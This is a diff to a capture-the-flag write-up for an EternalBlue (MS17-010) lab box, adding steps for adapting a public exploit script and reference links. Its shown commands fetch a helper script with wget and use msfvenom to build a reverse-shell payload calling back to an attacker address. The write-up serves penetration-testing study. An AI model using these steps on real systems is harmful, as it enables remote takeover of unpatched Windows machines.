@@ -34,6 +34,8 @@ nmap --script vuln 10.10.10.40
 
 
 ## Exploitation & Gaining Access & Privilege Escalation
+
+### Method 1: [CVE-2017-0144](https://www.exploit-db.com/exploits/42315)
 ```
 searchsploit ms17-010
 
@@ -44,18 +46,18 @@ mv 42315.py ms17-010.py
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ff3583a-8c7e-46f7-a6b0-27fbd1a5692b)
 
-Modify username as **guest** in the below exploit:
+Modify username as **guest** in the below python exploit code:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74f3513b-14eb-452e-98ba-2dd5bd2117da)
 
-Uncomment and modify:
+Uncomment two lines, update the exploit code with the reverse shell executable location and get the script to execute it:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7eb03635-3cf3-4bef-b318-aa69bb2263f0)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/521a14ec-bd35-4563-af1e-a7e350f62e53)
 
 ```
-On kali attack machine:
+# On kali attack machine:
 wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
 
 msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.24 LPORT=4444 -o ms17-010.exe
@@ -75,15 +77,21 @@ whoami
 
 
 # References & Alternatives
-+ x
++ https://vvmlist.github.io/#blue
++ https://medium.com/@dw3113r/hack-the-box-blue-writeup-without-metasploit-1c6f7e3c586c
+  + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/blue-writeup-w-o-metasploit
++ https://0xdf.gitlab.io/2021/05/11/htb-blue.html
++ 
 
 
 ## CVE Scripting
-+ x
++ **CVE-2017-0144:** https://www.exploit-db.com/exploits/42315
++ **CVE-2017-0143:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 
 
 ## Tools
-+ x
++ **mysmb.py:** https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+  + https://github.com/worawit/MS17-010
 
 
 ## Technical Knowledge
@@ -95,4 +103,5 @@ whoami
 
 
 ## For More
-+ x
++ https://msrc.microsoft.com/blog/2017/05/customer-guidance-for-wannacrypt-attacks/
++ 
